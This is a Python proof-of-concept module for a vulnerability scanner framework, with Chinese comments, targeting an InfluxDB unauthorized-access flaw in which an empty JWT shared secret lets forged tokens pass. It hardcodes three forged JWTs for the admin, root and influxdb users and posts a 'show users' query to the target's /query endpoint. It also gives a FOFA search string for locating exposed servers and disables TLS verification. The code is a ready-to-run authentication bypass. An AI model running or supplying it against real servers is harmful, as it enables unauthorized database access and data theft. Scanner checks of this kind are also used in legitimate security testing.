# coding:utf-8  
import requests
import re
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-01-01",        # POC创建时间
        "UpdateDate" : "2022-01-01",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "InfluxDB 未授权访问",                        # 漏洞名称
        "VulnID" : "oFx-2022-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "InfluxDB",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2022-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            influxdb是一款著名的时序数据库，其使用jwt作为鉴权方式。
            在用户开启了认证，但未设置参数shared-secret的情况下，jwt的认证密钥为空字符串，此时攻击者可以伪造任意用户身份在influxdb中执行SQL语句。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            app="influxdata-InfluxDB"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/query" # url自己按需调整
        data = "db=sample&q=show+users"
        
        users = [
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjozMzkyODM4NDI3fQ.nLFbzdjmyXA8JaaNPTQJx2V7QaY7QKdNEk8J37KzjKg",  # admin
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InJvb3QiLCJleHAiOjMzOTI4Mzg0Mjd9.CQoA4qksl5JlbZvuxDZ5NbxTYBVKgw38zaFFuknB2Bk",  # root
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImluZmx1eGRiIiwiZXhwIjozMzkyODM4NDI3fQ.if5__J9oZcNotrNnLTC_DoVS4sryD8oaq0n3mx55q_Q"  # influxdb
            ]
        
        regular = """\{"results":\[\{("statement_id":\d,)?"series":\[\{"columns":\[.+"""
        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Authorization":"",
                    "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            for i in users:
                headers["Authorization"] = "Bearer " + i
                req = requests.post(url,data = data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
                if req.status_code == 200 and re.match(regular,req.text.strip()):
                    vuln = [True,req.text]
                    break
                else:
                    vuln = [False,req.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()